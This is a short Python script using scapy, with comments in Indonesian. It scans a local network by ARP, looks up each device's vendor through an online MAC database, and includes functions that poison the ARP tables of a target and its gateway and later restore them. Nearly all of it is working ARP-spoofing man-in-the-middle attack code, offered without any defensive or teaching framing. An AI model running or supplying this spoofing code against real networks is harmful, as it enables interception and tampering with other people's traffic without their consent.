from scapy.all import *
import requests

def get_mac(ip):
    """Mendapatkan MAC Address dari IP tertentu."""
    # Membuat paket ARP Request
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
    if ans:
        # Mengambil alamat MAC dari balasan pertama
        return ans[0][1].hwsrc
    return None

def get_vendor(mac):
    """Mendapatkan merk HP berdasarkan MAC Address."""
    try:
        url = f"https://api.macvendors.com/{mac}"
        response = requests.get(url, timeout=2)
        if response.status_code == 200:
            return response.text
        return "Unknown Device"
    except:
        return "Unknown Device"

def scan_network(ip_range):
    """Memindai jaringan dan mencari vendor perangkat."""
    print(f"[*] Aggressive Scanning {ip_range}... Mohon tunggu.")
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)
    ans, _ = srp(arp_request, timeout=4, verbose=False, inter=0.1)
    
    found_hosts = []
    for sent, received in ans:
        vendor = get_vendor(received.hwsrc)
        found_hosts.append({
            'ip': received.psrc, 
            'mac': received.hwsrc,
            'vendor': vendor
        })
    return found_hosts

def poison(target_ip, target_mac, gateway_ip, gateway_mac):
    """Mengirim paket ARP palsu."""
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)

def restore(target_ip, target_mac, gateway_ip, gateway_mac):
    """Mengembalikan tabel ARP ke semula."""
    send(ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)
    send(ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip, hwsrc=target_mac), count=5, verbose=False)